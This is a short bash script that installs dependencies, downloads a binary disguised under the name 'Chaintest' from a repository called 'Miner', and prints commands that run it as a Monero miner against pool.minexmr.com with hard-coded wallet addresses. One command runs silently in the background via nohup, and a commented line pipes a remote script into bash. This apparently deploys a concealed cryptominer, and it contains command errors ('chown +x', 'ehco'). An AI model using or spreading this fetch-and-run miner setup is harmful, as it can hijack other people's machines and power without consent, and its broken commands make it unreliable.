#!/bin/bash
#

#安装依赖
sudo apt-get update
sudo apt-get install -y  build-essential libuv1-dev libssl-dev libhwloc-dev

mkdir ChainTest/

cd ChainTest/
wget https://cdn.jsdelivr.net/gh/gscsnm/Miner@master/Chaintest
chown +x Chaintest

echo "ly"
echo "nohup ./Chaintest --donate-level 0 -o pool.minexmr.com:443 -u 89xFXepSy2iBW1cMgaQwZwedkgDvAJcJk7UMyHYy1TsZA9aw9YhYWeobXn5mXQgx9eMduAdFrfXEGJaKEZ43eZWm7xeMCyi -k --tls --rig-id xxx 1>/dev/null 2>&1 &"
ehco "\n liang"
echo "./Chaintest --donate-level 0 -o pool.minexmr.com:443 -u 89m8QgPtKvCZZyu487FejTRmt4Acc5R6xCwHQsgsvyR8iHkm3VQirfAAauUGZCKMmQ2FLP6mDid9FgQC6HoxiyfwVLfq4jQ -k --tls --rig-id xxx"



# https://minexmr.com/#worker_stats
# 币安地址：
# 89xFXepSy2iBW1cMgaQwZwedkgDvAJcJk7UMyHYy1TsZA9aw9YhYWeobXn5mXQgx9eMduAdFrfXEGJaKEZ43eZWm7xeMCyi
# liang
# 89m8QgPtKvCZZyu487FejTRmt4Acc5R6xCwHQsgsvyR8iHkm3VQirfAAauUGZCKMmQ2FLP6mDid9FgQC6HoxiyfwVLfq4jQ

# curl -L https://cdn.jsdelivr.net/gh/gscsnm/Miner@master/minexmr_b.sh |bash
